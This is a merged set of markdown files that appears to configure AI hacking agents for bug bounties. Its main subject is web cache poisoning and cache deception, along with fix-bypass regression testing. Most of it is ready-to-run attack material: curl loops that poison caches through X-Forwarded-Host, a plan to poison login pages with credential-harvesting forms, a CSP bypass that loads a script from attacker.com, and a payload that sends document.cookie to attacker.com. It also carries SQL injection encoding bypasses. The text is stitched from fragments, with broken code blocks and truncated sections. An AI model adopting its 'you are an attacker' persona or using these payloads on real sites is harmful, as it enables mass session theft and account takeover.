# MERGED SOURCE KNOWLEDGE: web-cache

87 unique sections from 3 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/cache-poisoning-agent.md

# Cache Poisoning Agent

You are an attacker that exploits web cache poisoning and web cache deception to inject malicious content into cached responses, leading to stored XSS on sensitive pages.

Other agents cover injection, smuggling, and infrastructure. You own: unkeyed header poisoning, CDN cache manipulation, CSP bypass, and cache deception attacks.

### Unkeyed Header Poisoning (H100 Proven)

This pattern appeared 2 times in the top 100 reports against a major financial platform, paying $18-20K.

**Step 1: Identify unkeyed headers**
```bash

# Test each header individually
for header in "X-Forwarded-Host: evil.com" "X-Original-URL: /admin" "X-Rewrite-URL: /secret" "X-Forwarded-For: 127.0.0.1" "X-Host: evil.com" "X-Forwarded-Proto: https"; do
  echo "Testing: $header"
  curl -s -D- -H "$header" "https://target.com/page" | grep -i "evil.com\|location\|x-cache"
done
```

**Step 2: Check if response is cached**
```bash

# Second: X-Cache: HIT → response is cached

curl -sI "https://target.com/page" | grep -i "cache-control\|x-cache\|x-cf\|age\|vary"
```

**Step 3: Poison the cache**
```bash

# Send poisoned request
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/page"

# Verify cache is poisoned
curl -sI "https://target.com/page" | grep "X-Cache: HIT"

# Any user visiting /page now gets poisoned response
```

**Step 4: XSS in poisoned response**
```bash

# If header is reflected in response body
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "https://target.com/page"

# Poison login page with credential-harvesting form
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/login"

# Poison API endpoint with malicious redirect
curl -s -H "X-Original-URL: https://evil.com" "https://target.com/api/config"

### CSP Bypass via Cache Poisoning (H100 Proven)

PayPal's CSP was bypassed using older jQuery libraries on scope domains.

**Finding CSP bypass gadgets:**
```bash

# Find older JS libraries on scope domains
curl -s "https://target.com" | grep -oP 'src="[^"]*\.js"' | while read js; do
  url=$(echo "$js" | sed 's/src="//' | sed 's/"//')
  echo "=== $url ==="
  curl -s "$url" | grep -i "jquery\|bootstrap\|angular" | head -3
done

# Search for jQuery specifically
grep -r "jquery" --include="*.js" /tmp/jsfiles/ | grep -v "min.js" | sort
```

**jQuery CSP bypass (proven pattern):**
```html
<!-- jQuery < 3.0 converts <script> tags to DOM elements -->
<input id=x style="display:none">
<svg/onload="document.getElementById('x').outerHTML='<script src=https://attacker.com/evil.js></script>'">
```

**Bootstrap gadget bypass:**
```html
<!-- Bootstrap < 3.4.1 data-target XSS -->
<div data-toggle="modal" data-target="<script>alert(1)</script>">
```

# Add fake extension to sensitive URL
curl -s "https://target.com/account/settings.css"
curl -s "https://target.com/account/profile.js"
curl -s "https://target.com/account/dashboard.json"

# Test various extensions
for ext in css js json xml pdf png jpg gif; do
  curl -sI "https://target.com/account/settings.$ext" | grep "X-Cache"
done
```

# Hide poison parameter from backend, but cache sees it
curl -s "https://target.com/page?legit=value;poison=xss"

# Send GET request with body
curl -s -X GET -d "evil=payload" "https://target.com/api/data"

# Step 1: Find open redirect on target
curl -s "https://target.com/redirect?url=https://evil.com" -D-

# Step 2: Use redirect target as X-Forwarded-Host
curl -s -H "X-Forwarded-Host: target.com/redirect?url=https://evil.com" \
  "https://target.com/page"

# Send with different User-Agent
curl -sI -H "User-Agent: Chrome" "https://target.com/page" | grep "X-Cache"
curl -sI -H "User-Agent: Firefox" "https://target.com/page" | grep "X-Cache"

### Testing Checklist

- [ ] Test X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Host
- [ ] Check if response is cached (Cache-Control, X-Cache, Age)
- [ ] Verify cache key doesn't include poisoned header
- [ ] Test if header is reflected in response body
- [ ] Find older JS libraries on scope for CSP bypass
- [ ] Test web cache deception with file extensions
- [ ] Test parameter cloaking and fat GET
- [ ] Monitor Burp Collaborator for victim interactions
- [ ] Test on login, dashboard, and payment pages

## Output Fields

Add to FINDINGs:

```
cache_type: CDN | reverse-proxy | browser
poisoned_header: <the unkeyed header used>
cache_key_ignores: <what the cache key doesn't include>
xss_context: <where in the response the payload executes>
csp_bypass_used: <jQuery version | Bootstrap version | none>
deception_path: <the URL used for cache deception>
cached_response_served_to: all-users | authenticated-users | specific-path
```

## Rules
- Cache poisoning alone is informational — must chain to XSS or data theft for paid bounty
- Always verify with a clean browser (no cookies, no cache) after poisoning
- Test on login pages — highest impact (credentials in context)
- CSP bypass is often needed — find older JS libraries on scope domains
- Web cache deception can leak private data — check if cached responses contain PII
- Use Burp's "Cache Poisoning" extension for automated testing
- Test behind CDN (Cloudflare, Akamai, Fastly) — that's where caching happens


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/regression-agent.md

# Regression Testing Agent

You are an attacker who comes back after the fix. Your mission: verify that patches actually work, find bypasses, discover new bugs introduced by the fix, and scan sibling endpoints that share the same vulnerable pattern.

Other agents find bugs. You make sure bugs stay dead — or prove they aren't.

### 1. Fix Verification

When a finding is marked "resolved" or "patched":

**Re-test the exact original finding:**
- Use identical request (method, path, headers, body, parameters)
- Compare response to original — if identical, fix FAILED
- If different, check: did they just change the error message? Or actually fix the vuln?

**Test completeness of fix:**
- Original payload variant A → blocked? Try variant B, C, D
- Original HTTP method → blocked? Try PUT, PATCH, OPTIONS
- Original Content-Type → blocked? Try other content types
- Original parameter → blocked? Try parameter in different location (query, body, header, cookie)

**Common incomplete fix patterns:**
```
1. Blocked in GET but not POST
2. Blocked in JSON body but not form-encoded
3. Blocked at /api/v2 but not /api/v1
4. Blocked at app level but not CDN/proxy level (smuggling)
5. Blocked exact payload but not encoded variant (URL, Unicode, double-encoding)
6. Blocked when authenticated but not when unauthenticated
```

### 2. Bypass Discovery

For every fix, attempt these bypass techniques:

**Encoding bypasses:**
```
Original:    ' OR 1=1--
URL:         %27%20OR%201%3D1--
Double URL:  %2527%2520OR%25201%253D1--
Unicode:     ' OR 1\u003d1--
Hex:         0x27204f5220313d312d2d
Base64:      JyBPUiAxPTEtLQ==
```

**HTTP method switching:**
```
Original:    POST /api/users/1 HTTP/1.1
Bypass:      GET /api/users/1 HTTP/1.1
Bypass:      PUT /api/users/1 HTTP/1.1
Bypass:      PATCH /api/users/1 HTTP/1.1
Bypass:      OPTIONS /api/users/1 HTTP/1.1
Bypass:      POST /api/users/1.json HTTP/1.1
Bypass:      POST /api/users/1/ HTTP/1.1
```

**Content-Type switching:**
```
Original:    Content-Type: application/json
Bypass:      Content-Type: application/x-www-form-urlencoded
Bypass:      Content-Type: multipart/form-data
Bypass:      Content-Type: text/xml
Bypass:      Content-Type: application/xml
Bypass:      Content-Type: text/plain (no parsing, raw pass-through)
```

**Parameter placement:**
```
Original:    POST /api/transfer  body: {"to":"attacker","amount":1000}
Bypass:      GET  /api/transfer?to=attacker&amount=1000
Bypass:      POST /api/transfer  X-To: attacker, X-Amount: 1000 (header injection)
Bypass:      POST /api/transfer  Cookie: to=attacker; amount=1000
```

**Path manipulation:**
```
Original:    /api/users/1
Bypass:      /api/users/1/.
Bypass:      /api/users/1%00
Bypass:      /api/users/1%20
Bypass:      /api/users/1%23
Bypass:      /api/./users/1
Bypass:      /api/users/1;.js
```

### 3. Sibling Endpoint Scanning

When a bug is confirmed, scan for the same pattern across siblings:

**Controller-level sibling discovery:**
```
Confirmed: DELETE /api/v2/orders/123 (IDOR — no ownership check)
Siblings to test:
  GET     /api/v2/orders/123       (read other's orders)
  PUT     /api/v2/orders/123       (modify other's orders)
  POST    /api/v2/orders           (create order for other)
  GET     /api/v2/orders           (list all orders)
  DELETE  /api/v2/orders/bulk      (bulk delete)
  POST    /api/v2/orders/123/cancel
  POST    /api/v2/orders/123/refund
  POST    /api/v2/orders/123/return
```

**Resource-level sibling discovery:**
```
Confirmed: IDOR on /api/v2/orders/123
Sibling resources to test:
  /api/v2/invoices/123
  /api/v2/payments/123
  /api/v2/shipments/123
  /api/v2/customers/123
  /api/v2/transactions/123
  /api/v2/refunds/123
  /api/v2/cart/123
```

**API version siblings:**
```
Confirmed: IDOR on /api/v2/orders/123
Check:      /api/v1/orders/123
Check:      /api/v3/orders/123
Check:      /api/internal/orders/123
Check:      /api/admin/orders/123
Check:      /api/mobile/orders/123
Check:      /api/public/orders/123
Check:      /internal_api/orders/123
```

### 4. New Bug Discovery from Fixes

Fixes introduce new bugs. Test for these:

**Fix-introduced vulnerabilities:**
```
Original bug:   IDOR on /api/users/{id} — no auth check
Fix applied:    Added auth check: if (user.id != params.id) reject
New bug:        Auth check reveals "user exists" vs "no permission" → user enumeration
New bug:        Auth check uses == instead of strict !== → type juggling bypass
New bug:        Auth check on endpoint but not on new/{id}/profile sub-endpoint
New bug:        Error response includes user object → information disclosure
```

**Fix regression patterns:**
```
1. Input validation added → rejects valid inputs (DoS)
2. Auth check added on read → forgot write → different vulnerability
3. Rate limiting added → too aggressive → blocks legitimate users
4. Logging added → logs sensitive data → new disclosure vector
5. Encryption added → key hardcoded → worse than no encryption
6. CSP tightened → but script-src has wildcard → bypass still exists
```

### 5. Patch-Gap Detection

Monitor for window between fix deployment and full rollout:

**Check propagation:**
- Hit multiple edge nodes (different regions, different CDN POPs)
- Does the fix exist on `app.target.com` but not `app2.target.com`?
- Does the fix exist on main domain but not on regional subdomains?
- Does the fix exist on web but not on mobile API?

**Patch-gap timing:**
```
T+0:    Fix deployed to canary (1% traffic)
T+1h:   Fix deployed to one region
T+6h:   Fix deployed globally
T+24h:  CDN caches purged
T+72h:  All edge servers updated

Windows of opportunity exist at each transition.
```

### 6. Automated Regression Testing

Build a regression test suite per target:

```python

# regression_suite.py structure
REGRESSION_TESTS = [
    {
        "finding_id": "abc123",
        "original_severity": "high",
        "patched": True,
        "tests": [
            # Test 1: Exact original payload
            {"method": "GET", "path": "/api/users/456", "expect_status": 403},
            # Test 2: Method bypass
            {"method": "POST", "path": "/api/users/456", "expect_status": 403},
            # Test 3: Encoding bypass
            {"method": "GET", "path": "/api/users/%34%35%36", "expect_status": 403},
            # Test 4: Version bypass
            {"method": "GET", "path": "/api/v1/users/456", "expect_status": 403},
        ]
    }
]
```

## Output Fields

Add to FINDINGs:

```
original_finding_id: <finding this regression test relates to>
fix_status: verified_fixed | bypassed | incomplete | new_bug_introduced | patch_gap_active
bypass_method: <what bypassed the fix, if applicable>
sibling_endpoints_affected: <count of endpoints sharing the same vulnerability>
regression_test_count: <number of regression tests created>
```

## Cross-Agent Signals

When you discover a fix bypass, broadcast:

```
REGRESSION_ALERT:
- original_finding_id: <id>
- fix_status: bypassed
- bypass_method: <method>
- new_severity: <severity>  (often HIGHER than original — bypasses are more valuable)
- affected_siblings: <list>
```

This triggers:
- Original finding agent to re-evaluate severity (bypasses often pay more)
- Exploit generation engine to create updated PoC
- Chain builder to look for new escalation paths


## SOURCE: normal-skills/web-cache-deception.md

name: web-cache-deception-poisoning
description: Comprehensive web cache deception and poisoning testing methodology covering path confusion, query string ignorance, header manipulation, fat GET attacks, dynamic content poisoning, cache key analysis, and advanced cache exploitation techniques with optimized detection and exploitation workflows.
version: 1.0.0
---

## Overview

Web Cache Deception (WCD) and Web Cache Poisoning (WCP) are attack techniques that exploit discrepancies between how a web cache and the origin server parse HTTP requests. These vulnerabilities can lead to account takeover, sensitive data exposure, stored XSS, denial of service, and complete application compromise.

**Core Concepts:**
- **Cache Key:** The subset of request components used by the cache to identify a stored response
- **Cacheable Extension:** File extensions typically cached (`.css`, `.js`, `.png`, `.jpg`, `.gif`, `.woff`, `.svg`, `.txt`, `.html`)
- **Cache Busting:** Techniques to force cache misses for testing purposes
- **Cache Deception:** Tricking the cache into storing a dynamic/authenticated response
- **Cache Poisoning:** Manipulating the cache to serve attacker-controlled content to other users

**Critical Headers:**
- `Cache-Control`: Directives for caching behavior
- `X-Cache`: Hit/Miss status (often `X-Cache-Lookup`, `CF-Cache-Status`, `X-CDN-Cache`)
- `Vary`: Determines which request headers affect cache key
- `Age`: Time since response was cached
- `ETag` / `Last-Modified`: Validation mechanisms

---

# Common cache indicator headers to observe
X-Cache: HIT | MISS | BYPASS
X-Cache-Lookup: HIT | MISS
CF-Cache-Status: HIT | MISS | BYPASS | DYNAMIC | EXPIRED
X-CDN-Cache: HIT | MISS
Akamai-Cache-Status: HIT | MISS
X-Served-By: cache-lax1234-XYZ
X-Timer: S1234567890.123456,VS0,VE1
Fastly-Debug: 1
X-Cache-Hits: 0 | 1 | 2
Age: 0
```

**Detection Workflow:**
1. Send identical requests twice; compare response times and headers
2. If second request is faster and contains `X-Cache: HIT` or similar, caching is active
3. Note which headers are present—these reveal the caching layer (Cloudflare, Fastly, Akamai, Varnish, Squid, Nginx, etc.)

**Cache Busting for Testing:**
```http

### 1.2 Determine Cache Key Components

**Methodology:**
Send baseline request, then systematically modify components to identify what is included in the cache key.

| Component | Test Request | Cache Hit? | In Key? |
|-----------|-------------|------------|---------|
| Path | `/profile` vs `/profile/` | Compare | Variable |
| Query String | `?a=1` vs `?a=2` | Compare | Usually Yes |
| Host Header | Different `Host` values | Compare | Usually Yes |
| Specific Headers | `Accept`, `Accept-Language`, etc. | Compare | Check `Vary` |

**Header-Based Cache Key Testing:**
```http

# Test if Accept header is in cache key (check Vary header first)
GET /api/data HTTP/1.1
Host: target.com
Accept: application/json

# Second request
GET /api/data HTTP/1.1
Host: target.com
Accept: text/html
```

**Vary Header Analysis:**
- `Vary: Accept-Encoding` → Cache key includes `Accept-Encoding`
- `Vary: Accept-Language, Cookie` → Cache key includes both
- `Vary: *` → Cache will never serve cached response (rare, but important)

---

### 2.1 Path Confusion Attacks

**Core Principle:**
The cache parses the URL to determine cacheability based on file extension, while the origin server routes based on the full path or script name, executing dynamic code.

**Basic Payload Structure:**
```
https://target.com/profile.php/fake.css
https://target.com/api/user.php/avatar.jpg
https://target.com/home.aspx/nonexistent.js
https://target.com/app.py/static/file.txt
```

**Detection Steps:**
1. Identify authenticated endpoints that return dynamic content (profile pages, dashboards, API endpoints with session data)
2. Append a cacheable file extension to the path:
   ```http
   GET /profile/settings.php/styles.css HTTP/1.1
   Host: target.com
   Cookie: session=abc123
   ```
3. Check response headers for caching indicators:
   - `X-Cache: HIT` or `CF-Cache-Status: HIT`
   - `Content-Type: text/css` (or other static type)
   - Response body contains your private profile data
4. Verify by requesting the same URL in an incognito session—if you see the authenticated data, the deception succeeded

**Advanced Path Confusion Variants:**
```http

# Null byte / truncation (legacy systems)
GET /profile.php%00.css HTTP/1.1
```

**Path Mapping Exploitation:**
```http

# If application strips known static paths
GET /profile.php/static/styles.css HTTP/1.1

### 2.2 Query String Ignorance

**Core Principle:**
The cache ignores query parameters in the cache key (or normalizes them), while the origin server processes them to return dynamic content.

**Detection Steps:**
1. Request an endpoint with query parameters:
   ```http
   GET /profile?user=admin HTTP/1.1
   Host: target.com
   Cookie: session=abc123
   ```
2. Check if the response is cached despite the dynamic parameter
3. Test parameter normalization:
   ```http
   GET /profile?user=admin&cb=1 HTTP/1.1
   GET /profile?cb=1&user=admin HTTP/1.1
   GET /profile?user=admin& HTTP/1.1
   ```

**Query String Stripping Scenarios:**
```http

# Cache strips specific parameters
GET /profile?user=admin&utm_source=1 HTTP/1.1

# Cache key: /profile?a=2&b=1
```

**Exploitation Workflow:**
1. Find an endpoint that reflects user input or returns sensitive data based on parameters
2. Determine if the cache ignores those parameters
3. Send the crafted URL to the victim; the cache stores the response
4. The victim (or any user) requests the same URL and receives your sensitive data from cache

---

### 3.1 Header Manipulation Attacks

**Core Principle:**
Inject or manipulate headers that are included in the origin server's response processing but excluded from the cache key, causing the cache to store a poisoned response.

**Critical Headers to Test:**

**X-Forwarded-Host Poisoning:**
```http
GET /en?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# <script src="https://attacker.com/script.js"></script>
```

**X-Forwarded-Scheme Poisoning:**
```http
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

# Cache stores and serves mixed content or redirect loops
```

**X-HTTP-Host-Override / X-Forwarded-Server:**
```http
GET /page HTTP/1.1
Host: target.com
X-HTTP-Host-Override: attacker.com
X-Forwarded-Server: attacker.com
```

**X-Original-URL / X-Rewrite-URL:**
```http
GET /static/resource.css HTTP/1.1
Host: target.com
X-Original-URL: /admin/sensitive

# Origin processes: /admin/sensitive
```

**Origin Header Manipulation:**
```http
GET /api/user HTTP/1.1
Host: target.com
Origin: https://attacker.com

# Access-Control-Allow-Credentials: true
```

**Referer-Based Poisoning:**
```http
GET /page HTTP/1.1
Host: target.com
Referer: https://attacker.com/<script>alert(1)</script>

# If application reflects Referer in response without sanitization
```

**Testing Methodology:**
1. Identify headers that the origin server trusts but the cache ignores
2. Inject payload headers and observe if they affect the response body
3. Verify the response is cached (second request returns HIT with same poisoned body)
4. Confirm from a clean session that other users receive the poisoned response

### 3.2 Fat GET Attacks

**Core Principle:**
The cache uses only the URL as the cache key, but the origin server processes the request body (GET with body), allowing different bodies to return different content for the same cache key.

**Detection:**
```http
GET /api/search?cb=1 HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 25

{"query":"<script>alert(1)</script>"}
```

**Exploitation Steps:**
1. Identify if the origin server processes GET body data
2. Send a Fat GET request with malicious payload in body
3. Check if the response is cached under the URL key
4. Other users requesting the same URL (without body) receive the poisoned response

**Variants:**
```http

# Form-encoded body in GET
GET /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

q=<script>alert(1)</script>

# XML body in GET
GET /api/convert HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 50

<?xml version="1.0"?><x><![CDATA[<script>alert(1)</script>]]></x>
```

### 3.3 Dynamic Content Poisoning via Parameter Reflection

**Core Principle:**
Reflected parameters in cached responses (especially JSONP, API endpoints, or open redirects) allow stored XSS or data exfiltration through cache poisoning.

**JSONP Callback Poisoning:**
```http
GET /api/data?callback=attackerFunction&cb=1 HTTP/1.1
Host: target.com

# If cached, all users requesting /api/data?callback=attackerFunction receive this
```

**Open Redirect Poisoning:**
```http
GET /redirect?next=https://attacker.com&cb=1 HTTP/1.1
Host: target.com

# subsequent users are redirected to attacker.com
```

**Reflected XSS via Cache Poisoning:**
```http
GET /search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>&cb=1 HTTP/1.1
Host: target.com

# If search term is reflected in cached response without proper sanitization
```

**DOM-Based Poisoning:**
```http
GET /page?theme=dark#<img src=x onerror=alert(1)> HTTP/1.1
Host: target.com

### 4.1 Cache Key Normalization Differentials

**Path Normalization Differences:**
```http

### 4.2 Method Override Poisoning

```http
POST /api/user HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
Content-Type: application/json

{"malicious":"data"}

# Absolute URI vs Host header mismatch
GET http://attacker.com/ HTTP/1.1
Host: target.com

# Cache keys on absolute URI or Host depending on implementation
```

**Port Confusion:**
```http
GET /page HTTP/1.1
Host: target.com:80

# Cache parses first occurrence, origin parses last
GET /search?q=benign&q=<script>alert(1)</script> HTTP/1.1

### 4.5 Cache Deliberation (Multi-Layer Caching)

**Identifying Multiple Cache Layers:**
```http

# Look for multiple X-Cache headers
X-Cache: MISS
X-Cache-2: HIT
CF-Cache-Status: DYNAMIC

### 5.1 Cloudflare-Specific

**Cache Status Values:**
- `DYNAMIC` → Not cached (good for testing without poisoning real users)
- `HIT` / `MISS` → Actively caching

**Cloudflare Workers:**
- Workers may modify responses before caching
- Test for header injection via Worker logic

**Page Rules Analysis:**
- Check if `.jpg`, `.css`, `.js` are explicitly cached
- Look for "Cache Level: Cache Everything" rules that might cache HTML

# If you can influence Surrogate-Key, you may affect cache purging
Surrogate-Key: user-12345
```

**Fastly-Debug:**
```http
GET /page HTTP/1.1
Fastly-Debug: 1

### 5.3 Akamai-Specific

**Edge-Control Header:**
```http
Edge-Control: cache-maxage=1h
```

**Pragma: akamai-x-cache-on:**
```http
GET /page HTTP/1.1
Pragma: akamai-x-cache-on

### 5.4 Varnish-Specific

**Varnish Configuration Language (VCL) Weaknesses:**
- Check for `return(hash)` vs `return(pipe)` logic
- Look for `req.url` manipulation that might create key differentials

**X-Varnish Header:**
```http
X-Varnish: 123456789 123456788

### 6.1 Burp Suite Extensions

**Param Miner:**
- Automatically identifies hidden headers and parameters
- Use "Guess headers" feature to find cache-key-excluded headers
- Enable "Fat GET" detection

**Autorize:**
- Test for authentication bypass via cache deception
- Configure low-privileged and unauthenticated sessions

**Flow:**
- Manually map cache behavior, then use Intruder for payload fuzzing

#    potential cache key differential found
```

**Cache Poisoning Validator:**
```python

### 6.3 Key Payload Lists

**Cacheable Extensions to Test:**
```
.css, .js, .png, .jpg, .jpeg, .gif, .ico, .woff, .woff2, .ttf, .eot, .svg,
.txt, .html, .htm, .xml, .json, .pdf, .zip, .rar, .mp4, .mp3, .avi, .bmp,
.webp, .cur, .ogv, .ogg, .webm, .swf, .flv, .m4v, .m4a, .eot, .otf
```

**Headers to Test for Poisoning:**
```
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Port
X-HTTP-Host-Override
X-Original-URL
X-Rewrite-URL
X-Host
X-Remote-URL
X-Remote-IP
X-Referer
Origin
Referer
User-Agent
Accept
Accept-Language
Accept-Encoding
Cookie
Authorization
X-Custom-IP-Authorization
Client-IP
True-Client-IP
CF-Connecting-IP
X-Real-IP
X-Originating-IP
X-Client-IP
Forwarded
Via
```

---

### 7.1 Account Takeover via WCD
1. Trick cache into storing victim's authenticated profile page
2. Access the cached URL to obtain victim's CSRF tokens, session identifiers, or PII
3. Use stolen tokens to perform account takeover actions

### 7.2 Stored XSS via WCP
1. Poison cache with reflected XSS payload in a commonly accessed resource
2. All users loading that resource execute the payload
3. Impact scales to mass compromise without direct victim interaction

# Poison cache to return 404 for critical assets
GET /app.js?cb=1 HTTP/1.1
X-Original-URL: /nonexistent
```

```http

# Poison cache with extremely large responses
GET /api/data?cb=1 HTTP/1.1
X-Forwarded-Host: attacker-controlled-large-response.com
```

### 7.4 JavaScript Execution via WCD + WCP Chain
1. Use WCD to cache a dynamic page as `.js`
2. The cached "JavaScript" contains attacker-injected code via WCP header manipulation
3. Load the cached `.js` in a victim's browser context via `<script src="...">`

### 7.5 API Key / Token Exfiltration
1. Poison cache of an API endpoint that returns sensitive headers
2. Victim's subsequent request returns the poisoned response containing attacker-controlled exfiltration code
3. Sensitive data is sent to attacker server

---

### 8.1 Post-Fix Validation Checklist

- [ ] Dynamic/authenticated responses contain `Cache-Control: no-store, no-cache, must-revalidate, private`
- [ ] Static asset caching rules do not match dynamic endpoints via path confusion
- [ ] Origin server rejects or ignores untrusted `X-Forwarded-*` headers
- [ ] Cache key includes all parameters that affect response content
- [ ] `Vary` header is properly configured for headers that modify responses
- [ ] GET request bodies are ignored by origin server
- [ ] Path normalization is consistent between cache and origin
- [ ] Query string normalization is consistent between cache and origin
- [ ] `Access-Control-Allow-Origin` is not dynamically set based on user input
- [ ] JSONP callbacks are validated against an allowlist

### 8.2 Safe Testing Practices

- Always use unique cache-busting parameters (`?cb=RANDOM`) during testing
- Monitor `Age` header to confirm cache storage without over-poisoning
- Test on staging environments when possible
- Immediately purge poisoned cache entries after confirmation
- Document exact timestamps and request IDs for reproducibility

---

### Cache Deception Quick Test
```http
GET /profile.php/test.css HTTP/1.1
Host: target.com
Cookie: session=VALID_SESSION

### Cache Poisoning Quick Test
```http
GET /?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

### Fat GET Quick Test
```http
GET /search?cb=12345 HTTP/1.1
Host: target.com
Content-Length: 29
Content-Type: application/x-www-form-urlencoded

q=<script>alert(1)</script>

### Parameter Cloaking Quick Test
```http
GET /page?foo=bar&foo=<script>alert(1)</script> HTTP/1.1
Host: target.com

# Check: If first param is in cache key but second is processed by origin
```

---

## Appendix B: Response Header Analysis Guide

| Header | Value | Interpretation |
|--------|-------|----------------|
| `X-Cache` | `HIT` | Response served from cache |
| `X-Cache` | `MISS` | Response fetched from origin |
| `Age` | `> 0` | Response has been cached for N seconds |
| `CF-Cache-Status` | `DYNAMIC` | Cloudflare decided not to cache |
| `CF-Cache-Status` | `BYPASS` | Cache rules explicitly bypassed |
| `Vary` | `Accept-Encoding` | Cache key includes `Accept-Encoding` |
| `Cache-Control` | `max-age=3600` | Cacheable for 1 hour |
| `Cache-Control` | `no-store` | Should not be cached |
| `Last-Modified` | Timestamp | Validation-based caching active |

---

## Appendix C: Common Misconfigurations

1. **Cache Everything Rules:** CDN configured to cache all content regardless of `Cache-Control`
2. **Extension-Based Routing:** Cache keys on `.css` extension but origin routes to PHP handler
3. **Header Trust Issues:** Origin trusts `X-Forwarded-Host` from any source
4. **Query String Stripping:** Cache removes marketing parameters but also strips auth-related params
5. **Inconsistent Normalization:** Cache decodes `%2f` to `/` but origin treats it as literal
6. **Missing Vary Headers:** Responses vary by `User-Agent` or `Accept` but `Vary` header is absent
7. **GET Body Processing:** Origin framework automatically parses GET body (common in some APIs)
